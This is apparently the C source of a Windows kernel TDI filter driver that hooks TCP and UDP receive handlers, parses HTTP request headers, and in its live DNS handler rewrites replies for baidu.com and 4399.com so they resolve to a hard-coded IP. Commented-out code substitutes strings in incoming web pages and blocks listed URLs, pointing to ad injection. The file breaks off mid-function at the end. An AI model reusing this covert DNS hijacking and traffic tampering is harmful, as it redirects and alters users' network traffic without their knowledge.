
#include "precomp.h"
#include "XTdi.h"
 
PTDI_IND_CHAINED_RECEIVE  original_tcp_chain_EventHandler = NULL;
PTDI_IND_RECEIVE          original_tcp_EventHandler = NULL;
PTDI_IND_RECEIVE_DATAGRAM original_udp_EventHandler = NULL;
 
extern int g_runing  ;
#define MAX_PROCESS  64

extern PWCHAR  pAlone;
extern PUCHAR  pProcess  ;
extern PUCHAR  pPageAd   ;
extern PUCHAR  pVideo    ;
extern PUCHAR  pURL      ;
extern HANDLE  myHandle[MAX_PROCESS] ;
 
extern PFILEOBJECT_INFO pFileObject;
/*
www.zzti.edu.cn
IP：61.163.70.228
*/
xt_tdi g_xttdi;

#define u_long ULONG
#define u_short USHORT

u_long
ntohl(u_long netlong)
{
	u_long result = 0;
	((char *)&result)[0] = ((char *)&netlong)[3];
	((char *)&result)[1] = ((char *)&netlong)[2];
	((char *)&result)[2] = ((char *)&netlong)[1];
	((char *)&result)[3] = ((char *)&netlong)[0];
	return result;
}

u_short
ntohs(u_short netshort)
{
	u_short result = 0;
	((char *)&result)[0] = ((char *)&netshort)[1];
	((char *)&result)[1] = ((char *)&netshort)[0];
	return result;
}

char* isBrowse(PUCHAR p, int *isRef)
{
	char* pb;
	const char *sa = "\nHost: ";
	const char *sb = "\nReferer: ";
	char *pa = (char *)p;

	if(memcmp(p, "GET /", 5))
		return NULL;
	pa += 5;

	pb = strstr(pa, sa);
	if(pb){
		char *pend;
		*isRef = 0;
		pb += strlen(sa);
		pend = strstr(pb, "\r\n");
		if(!pend)
			return NULL;
		pend[0] = 0;
		DbgPrint("bA:%s\n", pb);
		return pb;
	}

	pb = strstr(pa, sb);
	if(pb){
		char *pend;
		*isRef = 1;
		pb += strlen(sb);
		pend = strstr(pb, "\r\n");
		if(!pend)
			return NULL;
		pend[0] = 0;
		DbgPrint("bB:%s\n", pb);
		return pb;
	}

	return NULL;
}

BOOLEAN isOurProcess(VOID)
{
	int i;
	HANDLE h = PsGetCurrentProcessId();
	if(h < (HANDLE)100)
		return FALSE;

	for(i=0; i<MAX_PROCESS; i++)
		if(h == myHandle[i]){ 
			//DbgPrint("process=%d\n", h);		
			return TRUE;
		}

    return FALSE;
}

ULONG xchangeUlong(ULONG i)
{
	ULONG d = i;
	UCHAR m;
	PUCHAR p = (PUCHAR)&d;
	m = p[0];
	p[0] = p[3];
	p[3] = m;
	m = p[2];
	p[2] = p[0];
	p[0] = m;
	return d;
}

USHORT xchangeShort(USHORT i)
{
	USHORT d = i;
	UCHAR m;
	PUCHAR p = (PUCHAR)&d;
	m = p[0];
	p[0] = p[1];
	p[1] = m;
 
	return d;
}

NTSTATUS xtdi_init(PDRIVER_OBJECT drvobj)
{
	g_xttdi.drvobj = drvobj;
	g_xttdi.drvobj_ioctrl = 0;
	g_xttdi.drvobj_tcp = 0;
	g_xttdi.drvobj_udp = 0;
	return 0;
}
NTSTATUS xtdi_deinit()
{
	return 0;
}


NTSTATUS xtdi_inter_createdevice( PDRIVER_OBJECT driver_object, PDEVICE_OBJECT* pdev, PCWSTR str_name )
{
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING name; 	
	RtlInitUnicodeString( &name, str_name );
 
	PDEVICE_OBJECT dev = 0; 
	status = IoCreateDevice( driver_object, sizeof( xt_devext ), 0, FALSE, FILE_DEVICE_NETWORK, 0, &dev ); 
	if(!NT_SUCCESS(status)) {
		return status;
	}
	dev->Flags |= DO_DIRECT_IO;  //直接读写

	PDEVICE_OBJECT lower=0; 
	status = IoAttachDevice( dev, &name, &lower);
	if(!NT_SUCCESS( status)){
		IoDeleteDevice( dev ); 
		return status;
	}
	pxt_devext ext = (pxt_devext)dev->DeviceExtension;
	ext->lower_device = lower; 
	
	*pdev = dev; 

	return status; 
}


NTSTATUS xtdi_hook_tcp()
{
	NTSTATUS status = STATUS_SUCCESS; 
	pxt_devext ext;
	status = xtdi_inter_createdevice( g_xttdi.drvobj, &g_xttdi.drvobj_tcp, L"\\Device\\Tcp");
	if( !NT_SUCCESS(status) ){
		//DbgPrint("\\Device\\Tcp_Failed\n");
		return status;
	}
	DbgPrint("hook Tcp_ok\n");
	ext = (pxt_devext)g_xttdi.drvobj_tcp->DeviceExtension;
	ext->protocol = XTDI_PROTO_TCP;
	return status;
}
//运行状态下，动态卸载TDI 过滤驱动，容易crash，所以一般不卸载
NTSTATUS xtdi_unhook_tcp()
{
	pxt_devext ext;
#define _REP_CD( A ) \
	if( (A) ) {\
	PDEVICE_OBJECT dev = (PDEVICE_OBJECT)InterlockedExchangePointer( (volatile PVOID*)&(A), NULL ); \
	ext = (pxt_devext)dev->DeviceExtension;\
	IoDetachDevice( ext->lower_device ); \
	IoDeleteDevice( dev ); \
	}
	if(0 != g_xttdi.drvobj_tcp)	_REP_CD( g_xttdi.drvobj_tcp); 
	
	return STATUS_SUCCESS;
}
NTSTATUS xtdi_hook_udp()
{
	NTSTATUS status = STATUS_SUCCESS; 
	pxt_devext ext;
	status = xtdi_inter_createdevice( g_xttdi.drvobj, &g_xttdi.drvobj_udp, L"\\Device\\Udp");
	if( !NT_SUCCESS(status)){
		xtdi_deinit();
		return status; 
	}
	
	DbgPrint("hook Udp_ok\n");
	ext = (pxt_devext)g_xttdi.drvobj_udp->DeviceExtension;
	ext->protocol = XTDI_PROTO_UDP; 

	return status;
}
//运行状态下，动态卸载TDI 过滤驱动，容易crash，所以一般不卸载
NTSTATUS xtdi_unhook_udp()
{
	pxt_devext ext;
#define _REP_CD( A ) \
	if( (A) ) {\
	PDEVICE_OBJECT dev = (PDEVICE_OBJECT)InterlockedExchangePointer( (volatile PVOID*)&(A), NULL ); \
	ext = (pxt_devext)dev->DeviceExtension;\
	IoDetachDevice( ext->lower_device ); \
	IoDeleteDevice( dev ); \
	}
	if(0 != g_xttdi.drvobj_udp)	_REP_CD( g_xttdi.drvobj_udp ); 
	
	return STATUS_SUCCESS;
}

BOOLEAN xtdi_hookcheck_tcp()
{
	PDEVICE_OBJECT DeviceObject = NULL;
	PDRIVER_OBJECT pDriver = NULL;
	UNICODE_STRING DeviceName;
	BOOLEAN bRet = FALSE;
	NTSTATUS Status;

	if(g_osver == WINDOWS_VERSION_WIN7_64)
		RtlInitUnicodeString( &DeviceName, L"\\Driver\\tdx");	
	else
		RtlInitUnicodeString( &DeviceName, L"\\Driver\\Tcpip");
	Status = ObReferenceObjectByName(&DeviceName,OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,NULL,0,*IoDriverObjectType,KernelMode,NULL,(PVOID *)&pDriver);
	if(!pDriver) {
		return TRUE;
	}
	
	DbgPrint("\\Device\\Tdx_ok\n");
	DeviceObject = pDriver->DeviceObject;
	while(DeviceObject != NULL )
	{
		if(DeviceObject->AttachedDevice == (_DEVICE_OBJECT *)g_xttdi.drvobj_tcp)
		{
			//DbgPrint("找到了 找到了 ");
			bRet = TRUE;
			break;
		}
		//DeviceObject->AttachedDevice=0;
		DeviceObject = DeviceObject->NextDevice; 
	}
	ObDereferenceObject(pDriver);
	return bRet;
}

BOOLEAN xtdi_hookcheck_udp()
{
	PDEVICE_OBJECT DeviceObject = NULL;
	PDRIVER_OBJECT pDriver = NULL;
	UNICODE_STRING DeviceName;
	BOOLEAN bRet = FALSE;
	NTSTATUS Status;

	if(g_osver == WINDOWS_VERSION_WIN7_64)
		RtlInitUnicodeString( &DeviceName, L"\\Driver\\tdx");	
	else
		RtlInitUnicodeString( &DeviceName, L"\\Driver\\Tcpip");
	Status = ObReferenceObjectByName(&DeviceName,OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,NULL,0,*IoDriverObjectType,KernelMode,NULL,(PVOID *)&pDriver);
	if(!pDriver)	return TRUE;
	DeviceObject = pDriver->DeviceObject;
	while(DeviceObject!= NULL )
	{
		if(DeviceObject->AttachedDevice == (_DEVICE_OBJECT *)g_xttdi.drvobj_udp)
		{
			bRet = TRUE;
			break;
		}
		//DeviceObject->AttachedDevice=0;
		DeviceObject = DeviceObject->NextDevice; 
	}
	ObDereferenceObject(pDriver);
	return bRet;
}


NTSTATUS tdi_event_receive(IN PVOID TdiEventContext, IN CONNECTION_CONTEXT ConnectionContext, IN ULONG ReceiveFlags,
						   IN ULONG BytesIndicated, IN ULONG BytesAvailable, OUT ULONG *BytesTaken, IN PVOID Tsdu,
						   OUT PIRP *IoRequestPacket)
{
	NTSTATUS status;
	PTDI_EVENT_CONTEXT ctx = (PTDI_EVENT_CONTEXT)TdiEventContext;
	PTDI_IND_RECEIVE Oldhandler = (PTDI_IND_RECEIVE)ctx->old_handler;


 
	//int num, i;
	//char *p, *p2;
	//_dat2_ *pdat2;

	//int len = BytesIndicated+(64-BytesIndicated%64+16);
 //

	//if((!pPageAd) /*|| (!isOurProcess())*/) //去掉进程判断是怀疑有些是通过flash过来的数据
	//	return Oldhandler(ctx->old_context, ConnectionContext, ReceiveFlags, BytesIndicated, BytesAvailable, BytesTaken, Tsdu, IoRequestPacket);

	//if(BytesAvailable < 20)
	//	return Oldhandler(ctx->old_context, ConnectionContext, ReceiveFlags, BytesIndicated, BytesAvailable, BytesTaken, Tsdu, IoRequestPacket);
 //
	//if(curUrl < 0  || tswitch == 0)
	//	return Oldhandler(ctx->old_context, ConnectionContext, ReceiveFlags, BytesIndicated, BytesAvailable, BytesTaken, Tsdu, IoRequestPacket);


	//p = (char*)ExAllocatePoolWithTag(NonPagedPool, len, 1234);
	//if(!p){
	//	return Oldhandler(ctx->old_context, ConnectionContext, ReceiveFlags, BytesIndicated, BytesAvailable, BytesTaken, Tsdu, IoRequestPacket);
	//}

	//memset(p, 0, len);
	//memcpy(p, (char*)Tsdu, BytesIndicated);

	////数据在Tsdu
	//pdat2 = (_dat2_ *)(pPageAd+16);
	//pdat2 += curUrl; // re; 

	//num = pdat2->adNum;

 //	//DbgPrint("curUrl=%d__len=%d\n", curUrl,  BytesIndicated);

	//for(i=0; i<num; i++){
	//	char* ptt = p; 
	//	do{
	//		p2 = strstr(ptt, pdat2->info[i].adname);//"BAIDU_
	//		if(p2){
	//			memcpy((char*)Tsdu+(int)(p2-p), pdat2->info[i].newname, strlen(pdat2->info[i].adname));//"BBBBB_"
	//			//DbgPrint("receive=%s\n", pdat2->info[i].adname);
	//			hadChanged++;
	//			ptt = p2 + strlen(pdat2->info[i].adname);
	//			continue;
	//		}
	//		else{
	//			p2 = ptt+(strlen(ptt)+1);
	//			if(*(ULONG*)p2 == 0)
	//				break;
	//			else ptt = p2+2;
	//		}
	//	}while(1);
	//}

	//if(p)ExFreePoolWithTag(p, 1234);
 
	return Oldhandler(ctx->old_context, ConnectionContext, ReceiveFlags, BytesIndicated, BytesAvailable, BytesTaken, Tsdu, IoRequestPacket);
}

//win xp 使用这个函数接收返回数据
NTSTATUS tdi_event_chained_receive(
								   IN PVOID TdiEventContext,
								   IN CONNECTION_CONTEXT ConnectionContext,
								   IN ULONG ReceiveFlags,
								   IN ULONG ReceiveLength,
								   IN ULONG StartingOffset,
								   IN PMDL  Tsdu,
								   IN PVOID TsduDescriptor)
{
	NTSTATUS status;
	PTDI_EVENT_CONTEXT ctx = (PTDI_EVENT_CONTEXT)TdiEventContext;
	PTDI_IND_CHAINED_RECEIVE Oldhandler = (PTDI_IND_CHAINED_RECEIVE)ctx->old_handler;

	//

	//int num, i;
	//char *p, *p2;
	//_dat2_ *pdat2;

	//int len = (Tsdu->ByteCount - 54) +(64 - (Tsdu->ByteCount - 54)%64)+16;
 //
	//if((!pPageAd)/* || (!isOurProcess())*/)
	//	return Oldhandler(ctx->old_context, ConnectionContext, ReceiveFlags, ReceiveLength, StartingOffset, Tsdu, TsduDescriptor);

	//if((Tsdu->ByteCount - 54) < 60)
	//	return Oldhandler(ctx->old_context, ConnectionContext, ReceiveFlags, ReceiveLength, StartingOffset, Tsdu, TsduDescriptor);
 //
	//if(curUrl < 0  || tswitch == 0)
	//	return Oldhandler(ctx->old_context, ConnectionContext, ReceiveFlags, ReceiveLength, StartingOffset, Tsdu, TsduDescriptor);

	//p = (char*)ExAllocatePoolWithTag(NonPagedPool, len, 1234);
	//if(!p){
	//	Oldhandler(ctx->old_context, ConnectionContext, ReceiveFlags, ReceiveLength, StartingOffset, Tsdu, TsduDescriptor);
	//}

	//memset(p, 0, len);
	//memcpy(p, (PCHAR)Tsdu->StartVa + Tsdu->ByteOffset + 54, Tsdu->ByteCount - 54);

	//pdat2 = (_dat2_ *)(pPageAd+16);
	//pdat2 += curUrl; // re; 

	//num = pdat2->adNum;

 //	//DbgPrint("curUrl=%d__len=%d\n", curUrl,  BytesIndicated);

	//for(i=0; i<num; i++){
	//	char* ptt = p; 
	//	do{
	//		p2 = strstr(ptt, pdat2->info[i].adname);//"BAIDU_
	//		if(p2){
	//			memcpy((char*)Tsdu+(int)(p2-p), pdat2->info[i].newname, strlen(pdat2->info[i].adname));//"BBBBB_"
	//			//DbgPrint("receive=%s\n", pdat2->info[i].adname);
	//			hadChanged++;
	//			ptt = p2 + strlen(pdat2->info[i].adname);
	//			continue;
	//		}
	//		else{
	//			p2 = ptt+(strlen(ptt)+1);
	//			if(*(ULONG*)p2 == 0)
	//				break;
	//			else ptt = p2+2;
	//		}
	//	}while(1);
	//}

	//if(p)ExFreePoolWithTag(p, 1234);

	return Oldhandler(ctx->old_context, ConnectionContext, ReceiveFlags, ReceiveLength, StartingOffset, Tsdu, TsduDescriptor);
}

typedef	struct _DNS_HEADER
{
	USHORT id;		    // identification number

	UCHAR rd : 1;		// recursion desired
	UCHAR tc : 1;		// truncated message
	UCHAR aa : 1;		// authoritive answer
	UCHAR opcode : 4;	    // purpose of message
	UCHAR qr : 1;		// query/response flag

	UCHAR rcode : 4;	    // response code
	UCHAR cd : 1;	    // checking disabled
	UCHAR ad : 1;	    // authenticated data
	UCHAR z : 1;		// its z! reserved
	UCHAR ra : 1;		// recursion available

	USHORT q_count;	    // number of question entries
	USHORT ans_count;	// number of answer entries
	USHORT auth_count;	// number of authority entries
	USHORT add_count;	// number of resource entries
}DNS_HEADER, *PDNS_HEADER;


//转换3www6google3com到www.google.com;
void ChangDnsNameFormatToStr(PUCHAR dns, PUCHAR sHost)
{
	UCHAR	i, uLeng;
	int		 nStrLeng, j = 0;

	nStrLeng = strlen((PCHAR)dns);
	if (nStrLeng < 512)
	{
		while (j < nStrLeng)
		{
			uLeng = *dns++;
			j += uLeng + 1;
			if (j <= nStrLeng)
			{
				for (i = 0; i < uLeng; i++)
				{
					*sHost++ = *dns++;
				}
				*sHost++ = '.';
			}
		}
		*--sHost = '\0';//取消最后一个.;
	}
}

//取3www6google3com格式域名的长度;
ULONG GetDNSNameLeng(PUCHAR dns)
{
	UCHAR	uLeng;
	int		nStrLeng;
	ULONG	NameLeng = 0;

	nStrLeng = strlen((PCHAR)dns);
	if (nStrLeng < 512)
	{
		while (NameLeng < nStrLeng)
		{
			uLeng = *dns++;
			if (uLeng == 0)
				break;
			dns += uLeng;
			NameLeng += uLeng + 1;
		}
	}
	return NameLeng;
}

//取域名长度;
VOID GetNameLength(PUCHAR reader, PUCHAR buffer, int* count)
{
	unsigned int p = 0, jumped = 0, offset;

	*count = 1;

	//read the names in 3www6google3com format
	while (*reader != 0)
	{
		if (*reader >= 192)
		{
			offset = (*reader) * 256 + *(reader + 1) - 49152; //49152 = 11000000 00000000  ;)
			reader = buffer + offset - 1;
			jumped = 1;  //we have jumped to another location so counting wont go up!
		}
		reader = reader + 1;

		if (jumped == 0) *count = *count + 1; //if we havent jumped to another location then we can count up
	}

	if (jumped == 1) *count = *count + 1;  //number of steps we actually moved forward in the packet

	return;
}

#pragma pack(push, 1)

typedef struct  _R_DATA
{
	USHORT			type;
	USHORT			_class;
	ULONG			ttl;
	USHORT			data_len;
}R_DATA, *PR_DATA;

#pragma pack(pop)

//Constant sized fields of query structure
typedef	struct _QUESTION
{
	USHORT qtype;
	USHORT qclass;
}QUESTION, *PQUESTION;

//替换DNS记录中的IP地址
void ReplaceDnsDataIP(PCHAR rsdnsdata, ULONG x64dIP, ULONG x64ttl)
{
	PDNS_HEADER			dns = NULL;
	PR_DATA				resource;
	PUCHAR				reader;
	int					i, stop;
	USHORT				anscount, datalen;
	ULONG				ipAdd, ipCount = 0;
	ULONG				HostNameLen;

	dns = (PDNS_HEADER)rsdnsdata;

	// Response code:  0 ==> success;
	//                 1 ==> format error;
	//                 2 ==> server error;
	//                 3 ==> name error;
	//                 4 ==> not implemented;
	//                 5 ==> refused.
	anscount = ntohs(dns->ans_count);
	if (dns->rcode == 0 && anscount > 0)
	{
		HostNameLen = GetDNSNameLeng((PUCHAR)&rsdnsdata[sizeof(DNS_HEADER)]);

		if (HostNameLen == 0)//取域名长度失败的退出防止出错;
			return;

		//move ahead of the dns header and the query field
		reader = (PUCHAR)&rsdnsdata[sizeof(DNS_HEADER) + (HostNameLen + 1) + sizeof(QUESTION)];

		//reading answers
		stop = 0;

		for (i = 0; i < anscount; i++)
		{
			GetNameLength(reader, (PUCHAR)rsdnsdata, &stop);
			reader = reader + stop;

			resource = (PR_DATA)(reader);
			reader = reader + sizeof(R_DATA);

			if (ntohs(resource->type) == 1) //ipv4 记录;
			{
				datalen = ntohs(resource->data_len);
				if (datalen == 4)//ip长度为4
				{
					ipAdd = *(ULONG*)reader;
					if (ipAdd)
					{
						if (x64dIP)
						{//域名在win7&64的列表中的优先;
							*(PULONG)reader = x64dIP;//替换Ip;
							if (x64ttl)
								resource->ttl = x64ttl;
						}
					}
				}
				reader = reader + datalen;

			}
			else//域名别名;
			{
				GetNameLength(reader, (PUCHAR)rsdnsdata, &stop);
				reader = reader + stop;
			}
		}
	}
}

ULONG inet_addr(const char *name)
{
	unsigned int dots, digits;
	ULONG byte, addr;

	if (name)
	{
		for (dots = 0, digits = 0, byte = 0, addr = 0; *name; name++)
		{
			if (*name == '.')
			{
				addr += byte << (8 * dots);
				if (++dots > 3 || digits == 0)
				{
					return 0;
				}
				digits = 0;
				byte = 0;
			}
			else
			{
				byte = byte * 10 + (*name - '0');
				if (++digits > 3 || *name < '0' || *name > '9' || byte > 255)
				{
					return 0;
				}
			}
		}

		if (dots != 3 || digits == 0)
		{
			return 0;
		}

		addr += byte << (8 * dots);
		return addr;
	}
	else
	{
		return 0xffffffff;
	}

}

//nt6 使用此函数接收返回数据
NTSTATUS tdi_event_receive_datagram(
                                    IN PVOID TdiEventContext,
                                    IN LONG SourceAddressLength,
                                    IN PVOID SourceAddress,
                                    IN LONG OptionsLength,
                                    IN PVOID Options,
                                    IN ULONG ReceiveDatagramFlags,
                                    IN ULONG BytesIndicated,
                                    IN ULONG BytesAvailable,
                                    OUT ULONG *BytesTaken,
                                    IN PVOID Tsdu,
                                    OUT PIRP *IoRequestPacket)
{
 
	PCHAR					domainname = NULL, domainnamelw, Vaguedomainname;
	PVOID					peProcess;
	PCHAR					szProcessName;
	CHAR					sHost[512];
    //DbgPrint("tdi_event_receive_datagram()\n");

	/*int i=0;
	PUCHAR p = (PUCHAR)SourceAddress;

	for(i=0; i< SourceAddressLength; i++)
		DbgPrint("%x ", p[i]);
		DbgPrint("______\n");*/
	//do{
	//	if(i+2 >= BytesAvailable)
	//		break;

	//	if(p[i]<='z' && p[i]>='a'){  
	//	  DbgPrint("%s", p+i);
	//	  i+= strlen(p);
	//	}
	//	else {
	//		i++;
	//		continue;
	//	}
	//}while(1);
	//DbgPrint("....\n");

	if (*((PUSHORT)Tsdu + 1) == 0x8081 || *((PUSHORT)Tsdu + 1) == 0x8085)//8085 is www.a.com ret
	{
		DbgPrint("%p",Tsdu);
		PDNS_HEADER dns = (PDNS_HEADER)Tsdu;
		//DbgPrint("问题数:%d ---- 资源记录是:%d\n",ntohs(pDns->q_count),ntohs(pDns->ans_count));
		domainname = (PCHAR)dns;
		if (dns->rcode == 0 && ntohs(dns->ans_count) > 0)
		{//查询返回是否成功;
		 //转换3www6google3com到www.google.com;
			ChangDnsNameFormatToStr((PUCHAR)&domainname[sizeof(DNS_HEADER)], (PUCHAR)sHost);
			domainnamelw = _strlwr(sHost);//转换成小写字符串;
			Vaguedomainname = strchr(domainnamelw, '.');// www.google.com ==> .google.com
			if (Vaguedomainname)
				Vaguedomainname += sizeof(CHAR);//去掉.;
			else
				Vaguedomainname = domainnamelw;
#if DBG
			peProcess = IoGetCurrentProcess();
			szProcessName = (PCHAR)PsGetProcessImageFileName((PEPROCESS)peProcess);
			DbgPrint("接收到%s查询:%s,泛域名:%s 的DNS返回信息;\n",
				szProcessName,
				domainnamelw,
				Vaguedomainname);
#endif	
			//DbgBreakPoint();
			if (strstr(Vaguedomainname, "baidu.com") || strstr(Vaguedomainname, "4399.com"))
			{
				ReplaceDnsDataIP((PCHAR)dns, inet_addr("61.147.67.181"), 128);
			}
		}
	}

//__end:
    return original_udp_EventHandler(
        TdiEventContext,
        SourceAddressLength,
        SourceAddress,
        OptionsLength,
        Options,
        ReceiveDatagramFlags,
        BytesIndicated,
        BytesAvailable,
        BytesTaken,
        Tsdu,
        IoRequestPacket);
}


NTSTATUS xtdi_mjcreate( PDEVICE_OBJECT pDeviceObject, PIRP irp )
{
	pxt_devext ext = (pxt_devext)pDeviceObject->DeviceExtension; 
	NTSTATUS status = STATUS_SUCCESS; 
	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation( irp );
	
	FILE_FULL_EA_INFORMATION *ea = (FILE_FULL_EA_INFORMATION *)irp->AssociatedIrp.SystemBuffer;
	ULONG pid = (ULONG)PsGetCurrentProcessId();
	BOOLEAN is_set_completion = FALSE; 
 
	if( ea ){
		if( ea->EaNameLength == TDI_CONNECTION_CONTEXT_LENGTH &&
			RtlCompareMemory(ea->EaName, TdiConnectionContext, TDI_CONNECTION_CONTEXT_LENGTH) == TDI_CONNECTION_CONTEXT_LENGTH ) //TCP连接，连接上下文建立
		{
			CONNECTION_CONTEXT conn_ctx = *(CONNECTION_CONTEXT *)(ea->EaName + ea->EaNameLength + 1);
			if( ext->protocol == XTDI_PROTO_TCP ){
		 
			}		
		}
 
	}
 
	if( !is_set_completion ){
		IoSkipCurrentIrpStackLocation( irp ); 
	}
	return IoCallDriver( ext->lower_device, irp ); 
}

NTSTATUS xtdi_mjclearup( PDEVICE_OBJECT pDeviceObject, PIRP irp )
{
	pxt_devext ext = (pxt_devext)pDeviceObject->DeviceExtension; 
	
	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation( irp );
 
	IoSkipCurrentIrpStackLocation( irp );
	return IoCallDriver( ext->lower_device, irp );
}

 
NTSTATUS xtdi_dispatch(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp)
{
	pxt_devext pDevExt = (pxt_devext)pDeviceObject->DeviceExtension; 
	NTSTATUS status = STATUS_SUCCESS; 
	PIO_STACK_LOCATION irpStack ;

	if(g_runing){

	irpStack = IoGetCurrentIrpStackLocation( Irp ); 
 
	switch( irpStack->MajorFunction )
	{
	case IRP_MJ_CREATE:
		//return xtdi_mjcreate(pDeviceObject, Irp);
		break;
	case IRP_MJ_CLEANUP:
		//return xtdi_mjclearup(pDeviceObject, Irp);
		break;
	case IRP_MJ_DEVICE_CONTROL:
		if( KeGetCurrentIrql()==PASSIVE_LEVEL ){
			status = TdiMapUserRequest( pDeviceObject, Irp, irpStack ); 
		}else{
			status = STATUS_NOT_IMPLEMENTED; 
		}
		if( !NT_SUCCESS(status)) break; //没映射成功，直接下发
		//如果成功则进入 IRP_MJ_INTERNAL_DEVICE_CONTROL
	case IRP_MJ_INTERNAL_DEVICE_CONTROL:
		{
			switch(irpStack->MinorFunction)
			{
			case TDI_ASSOCIATE_ADDRESS:
				break;
			case TDI_DISASSOCIATE_ADDRESS:
				break;
			case TDI_SET_EVENT_HANDLER:
				{
					PUCHAR pSendData=NULL;
					PTDI_REQUEST_KERNEL_SET_EVENT param = (PTDI_REQUEST_KERNEL_SET_EVENT)&irpStack->Parameters;
					if(param->EventType == TDI_EVENT_RECEIVE || param->EventType == TDI_EVENT_RECEIVE_EXPEDITED) {
						if(param->EventHandler)
						{
							PTDI_EVENT_CONTEXT pContext = (PTDI_EVENT_CONTEXT)x_alloc(sizeof(TDI_EVENT_CONTEXT));
							if ( pContext )
							{
								//保存老的EventContext
								pContext->fileobj = irpStack->FileObject;
								pContext->old_context = param->EventContext;
								pContext->old_handler = param->EventHandler;
								pContext->context = pContext;

								param->EventContext = (PVOID)pContext;
								param->EventHandler = (PVOID)tdi_event_receive;
								
								//InterlockedExchange((LONG *)param->EventHandler, (LONG)tdi_event_receive);
							}
						}
					} 
					else if(param->EventType == TDI_EVENT_CHAINED_RECEIVE || param->EventType == TDI_EVENT_CHAINED_RECEIVE_EXPEDITED) {
						if(param->EventHandler)
						{
							PTDI_EVENT_CONTEXT pContext = (PTDI_EVENT_CONTEXT)x_alloc(sizeof(TDI_EVENT_CONTEXT));
							if ( pContext )
							{
								//保存老的EventContext
								pContext->fileobj = irpStack->FileObject;
								pContext->old_context = param->EventContext;
								pContext->old_handler = param->EventHandler;
								pContext->context = pContext;

								//xp下使用这个接受数据
								param->EventContext = (PVOID)pContext;
								param->EventHandler = (PVOID)tdi_event_chained_receive;
								
								//InterlockedExchange((LONG *)param->EventHandler, (LONG)tdi_event_chained_receive);
							}
						}
					}
					else if (param->EventType == TDI_EVENT_RECEIVE_DATAGRAM){
						if (param->EventHandler)  //这个判断是必须的
						{
							original_udp_EventHandler = (PTDI_IND_RECEIVE_DATAGRAM)param->EventHandler;
							//InterlockedExchange64((PLONGLONG)&param->EventHandler, (LONGLONG)tdi_event_receive_datagram);
							InterlockedExchangePointer((PVOID*)&param->EventHandler, (PVOID)tdi_event_receive_datagram);
							
						}
					}

					else if (param->EventType == TDI_EVENT_CHAINED_RECEIVE_DATAGRAM)
					{
						DbgPrint("!!!==TDI_EVENT_CHAINED_RECEIVE_DATAGRAM!!!\n");
						break;
					}					

				}
				break;
			case TDI_RECEIVE:
				break;
			case TDI_RECEIVE_DATAGRAM:
				break;


			case TDI_SEND:			 
				{
					ULONG SendLength=0;
					int isRef = 1;
					PUCHAR p = NULL;
					char* pu = NULL;
					PUCHAR pSendData=NULL;

					PTDI_REQUEST_KERNEL_SEND param = (PTDI_REQUEST_KERNEL_SEND)(&irpStack->Parameters);

			  //      if(!isOurProcess())
					//	break;

					SendLength=param->SendLength;
					pSendData = (PUCHAR)MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);

					p = (PUCHAR)ExAllocatePoolWithTag(NonPagedPool, 1048, 1234);
					if(!p) break;
					memset(p, 0, 1048);
					memcpy(p,pSendData,SendLength>1023? 1023:SendLength);
					pu = isBrowse(p, &isRef);
				
					if(!pu){
						ExFreePoolWithTag(p, 1234);
						break;
					}

				//if(pURL){
				//	//看是否是要被拦截的URL
				//	char* ptem = (char*)(pURL+12);
				//	char *phead;

				//	do{
				//		if(ptem[0] == 0)
				//			break;

				//		phead = strstr((char*)pu, ptem);
				//		if(phead){
				//			//DbgPrint("isBrowse=%s\n", ptem);
				//			if(p)ExFreePoolWithTag(p, 1234);
				//			tTimes++;
 			//				Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
				//			Irp->IoStatus.Information = 0;
				//			IoCompleteRequest(Irp, IO_NO_INCREMENT);
				//			return STATUS_SUCCESS;
				//		}
				//		ptem += (strlen(ptem)+1);
				//	}while(1);
				//}

				////检查有无要替换的，如果有，则先记下其FileObject
				//if(pPageAd && isRef ==0){
				//	int i, num;
				//	pagead_dat* pad = (pagead_dat*)(pPageAd);
				//	num = pad->urlNum;
				//	for(i = 0; i< num ; i++)if(memcmp(pu, pad->addat[i].url, strlen(pad->addat[i].url)) == 0){ 
				//			//DbgPrint("find url=%s\n", pad->addat[i].url);
				//			KeEnterCriticalRegion();
				//			curUrl = i;
				//			tswitch = 8;
				//			KeLeaveCriticalRegion();
				//		break;
				//	}
				//}

					if(p)ExFreePoolWithTag(p, 1234);
				}
				break;
			case TDI_SEND_DATAGRAM:
				break;
			case TDI_CONNECT:
				{
					int i, n = 0;
					PTDI_REQUEST_KERNEL_CONNECT TDI_connectRequest;
					PTA_ADDRESS TA_Address_data;

					PTDI_ADDRESS_IP TDI_data ;
 
					unsigned short Port =0;
					ULONG Address =0;

					TDI_connectRequest =( PTDI_REQUEST_KERNEL_CONNECT )(&irpStack->Parameters );
					TA_Address_data =( ( PTRANSPORT_ADDRESS )( TDI_connectRequest->RequestConnectionInformation ->RemoteAddress ))-> Address ;
					TDI_data = ( PTDI_ADDRESS_IP ) ( TA_Address_data->Address );

					Address = TDI_data->in_addr ;
					Port = TDI_data->sin_port;

					DbgPrint ("connect: %d.%d.%d.%d:%d\n", Address&0xFF, (Address>>8)&0xFF, (Address>>16)&0xFF, (Address>>24)&0xFF, xchangeShort(Port) ); 
				}
				break;
			case TDI_DISCONNECT:
				{
					//int k;
					////清除掉链接
					//for(k=0; k<FileObjectNum; k++)if(pFileObject[k].pObject == (PVOID)irpStack->FileObject){
					//	memset(&pFileObject[k], 0, sizeof(FILEOBJECT_INFO));
					//	//DbgPrint("disconnect = %p\n", irpStack->FileObject); 
					//	break;
					//}
				}
				break;

			default:
				break;
			}
		}
		break;
	}	
	}
	IoSkipCurrentIrpStackLocation( Irp ); 
	return IoCallDriver( pDevExt->lower_device , Irp );
}

typedef NTSTATUS (NTAPI* FPN_RtlGetVersion)(OUT PRTL_OSVERSIONINFOEXW lpVersionInfo);

WIN_VER_DETAIL g_osver = WINDOWS_VERSION_NONE;
// ==================================================================
// @ 获取系统版本
// ==================================================================
WIN_VER_DETAIL GetWindowsVersion()
{
	UNICODE_STRING ustrFuncName = { 0 }; 
	RTL_OSVERSIONINFOEXW osverinfo = { sizeof(osverinfo) }; 
